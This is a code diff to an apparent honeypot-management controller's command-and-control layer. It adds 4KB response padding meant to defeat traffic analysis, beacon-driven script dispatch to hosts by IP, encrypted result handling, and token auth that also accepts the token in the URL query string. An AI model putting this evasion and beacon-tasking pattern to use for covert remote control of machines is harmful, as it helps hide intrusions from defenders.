@@ -44,6 +44,24 @@ def _json_response(data: Any, status: int = 200) -> "web.Response":
     return web.json_response(data, status=status)
 
 
+def _pad_json_response(data: Any, status: int = 200, block_size: int = 4096) -> "web.Response":
+    """Return a JSON response padded to the next 4KB boundary.
+
+    C2 task responses vary in size (deploy script = 50KB, status check = 100
+    bytes). This size differential is a traffic analysis fingerprint. Padding
+    to a fixed block size makes all responses the same order of magnitude,
+    defeating size-based traffic analysis. The ``_padding`` key is ignored by
+    the worker.
+    """
+    if web is None:  # pragma: no cover
+        raise RuntimeError("aiohttp is not installed")
+    raw = json.dumps(data, default=str)
+    if len(raw) % block_size != 0:
+        target = ((len(raw) // block_size) + 1) * block_size
+        data["_padding"] = "x" * max(0, target - len(raw) - 16)
+    return web.json_response(data, status=status)
+
+
 def _query_limit(request: "web.Request", default: int, cap: int) -> int:
     """Parse an optional ``?limit`` query param safely.
 
@@ -334,18 +352,30 @@ class Controller:
         """
         if self.api_token:
             auth = request.headers.get("Authorization", "")
-            if not auth.endswith(self.api_token):
-                return _json_response({"error": "unauthorized"}, status=401)
+            presented = auth[len("Bearer "):].strip() if auth.startswith("Bearer ") else ""
+            qtoken = request.query.get("token", "")
+            if not (presented and hmac.compare_digest(presented, self.api_token)):
+                if not (qtoken and hmac.compare_digest(qtoken, self.api_token)):
+                    return _json_response({"error": "unauthorized"}, status=401)
         host = request.query.get("host", "")
         ip = request.query.get("ip", "")
-        # Look for pending tasks that match the beaconing host's IP.
-        tasks = await asyncio.to_thread(self.store.query_tasks, status="pending")
+        # Look for pending tasks matching the beaconing host's IP using
+        # a targeted query (C5: avoids loading all pending tasks).
+        if ip:
+            tasks = await asyncio.to_thread(
+                self.store.query_pending_by_target_ip, ip
+            )
+        else:
+            tasks = []
         for task in tasks:
-            target_ip = task.get("target", {}).get("ip", "") if isinstance(task.get("target"), dict) else ""
-            if target_ip and target_ip == ip:
-                script = task.get("script", "")
-                if script:
-                    return web.Response(text=script, content_type="text/plain")
+            script = task.get("script", "")
+            task_id = task.get("id", "")
+            if script and task_id:
+                # Mark as running so the next beacon doesn't re-dispatch (C3).
+                await asyncio.to_thread(
+                    self.store.claim_task_by_id, task_id, "cron-beacon"
+                )
+                return web.Response(text=script, content_type="text/plain")
         return web.Response(status=204)
 
     async def _api_health(self, request: "web.Request") -> "web.Response":
@@ -500,8 +530,19 @@ class Controller:
                         # and the task stayed "running" forever.
                         task_id = payload.get("task_id", "")
                         w_id = payload.get("worker_id", "")
-                        succ = bool(payload.get("success"))
-                        res = payload.get("result", {}) or {}
+                        # Decrypt encrypted WS task results when C2 encryption
+                        # is enabled and the worker sent api_version=2.
+                        if (self.c2_encrypt and self.crypto is not None
+                                and payload.get("api_version") == 2
+                                and "encrypted_result" in payload):
+                            from honeywatch.c2.crypto import decrypt_result
+                            decrypted = decrypt_result(payload, self.crypto)
+                            succ = bool(decrypted.get("success"))
+                            res = decrypted.get("result", {}) or {}
+                            w_id = decrypted.get("worker_id", w_id)
+                        else:
+                            succ = bool(payload.get("success"))
+                            res = payload.get("result", {}) or {}
                         completed = await asyncio.to_thread(
                             self.store.complete_task, task_id, w_id, succ, res
                         )
